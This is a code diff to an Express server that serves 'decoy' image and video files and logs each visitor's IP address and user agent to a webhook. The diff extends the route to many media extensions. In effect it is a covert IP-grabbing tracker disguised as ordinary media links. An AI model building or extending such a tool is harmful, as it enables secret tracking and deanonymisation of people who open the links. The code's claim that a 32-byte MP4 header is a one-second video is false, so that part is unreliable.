@@ -11,10 +11,10 @@ const upload = multer({
   storage: multer.memoryStorage(),
   limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
   fileFilter: (req, file, cb) => {
-    if (file.mimetype.startsWith('image/')) {
+    if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
       cb(null, true);
     } else {
-      cb(new Error('Only image files are allowed'));
+      cb(new Error('Only image and video files are allowed'));
     }
   }
 });
@@ -71,8 +71,15 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Serve the decoy image and log the request
-  app.get('/image.jpg', async (req: Request, res: Response) => {
+  // Serve decoy files and log the request - support multiple file types
+  app.get('/:filename.:extension', async (req: Request, res: Response) => {
+    const { filename, extension } = req.params;
+    
+    // Only handle common media file extensions
+    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
+    if (!allowedExtensions.includes(extension.toLowerCase())) {
+      return res.status(404).send('Not Found');
+    }
     try {
       const clientIp = getClientIp(req);
       const userAgent = req.headers['user-agent'] || '';
@@ -102,33 +109,53 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
 
-      // Serve uploaded image if available, otherwise default pixel
+      // Determine if it's a video or image request
+      const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());
+      
+      // Serve uploaded file if available, otherwise default content
       if (settings?.uploadedImageData && settings?.uploadedImageType) {
-        const imageBuffer = Buffer.from(settings.uploadedImageData, 'base64');
+        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
         res.set({
           'Content-Type': settings.uploadedImageType,
-          'Content-Length': imageBuffer.length,
+          'Content-Length': fileBuffer.length,
           'Cache-Control': 'no-cache, no-store, must-revalidate',
           'Pragma': 'no-cache',
           'Expires': '0'
         });
-        res.send(imageBuffer);
+        res.send(fileBuffer);
       } else {
-        // Serve default 1x1 transparent pixel
-        const pixel = Buffer.from([
-          0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
-          0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
-          0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x04, 0x01, 0x00, 0x3B
-        ]);
+        if (isVideo) {
+          // Serve minimal video file (1 second black video)
+          const minimalVideo = Buffer.from([
+            0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
+            0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
+          ]);
+          
+          res.set({
+            'Content-Type': 'video/mp4',
+            'Content-Length': minimalVideo.length,
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+          });
+          res.send(minimalVideo);
+        } else {
+          // Serve default 1x1 transparent pixel for images
+          const pixel = Buffer.from([
+            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
+            0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x04, 0x01, 0x00, 0x3B
+          ]);
 
-        res.set({
-          'Content-Type': 'image/gif',
-          'Content-Length': pixel.length,
-          'Cache-Control': 'no-cache, no-store, must-revalidate',
-          'Pragma': 'no-cache',
-          'Expires': '0'
-        });
-        res.send(pixel);
+          res.set({
+            'Content-Type': 'image/gif',
+            'Content-Length': pixel.length,
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+          });
+          res.send(pixel);
+        }
       }
     } catch (error) {
       console.error('Error serving image:', error);
